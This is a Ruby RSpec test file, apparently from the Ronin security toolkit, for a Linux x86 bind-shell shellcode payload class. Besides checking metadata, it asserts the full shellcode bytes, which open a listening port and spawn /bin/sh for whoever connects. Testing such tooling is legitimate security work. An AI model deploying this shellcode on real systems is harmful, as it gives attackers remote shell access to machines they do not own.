require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/x86/bind_shell'

describe Ronin::Payloads::Shellcode::Linux::X86::BindShell do
  it "must inherit from Ronin::Payloads::Shellcode::BindShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::BindShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/x86/bind_shell'" do
      expect(subject.id).to eq('shellcode/linux/x86/bind_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    let(:packed_port) { "\x05\x39".b }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x6a\x66\x58\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xd2\x52\x68\xff\x02#{packed_port}\x89\xe1\x6a\x10\x51\x50\x89\xe1\x89\xc6\x43\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50\x56\x89\xe1\x43\xb0\x66\xcd\x80\x93\x6a\x03\x59\x49\x6a\x3f\x58\xcd\x80\x75\xf8\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
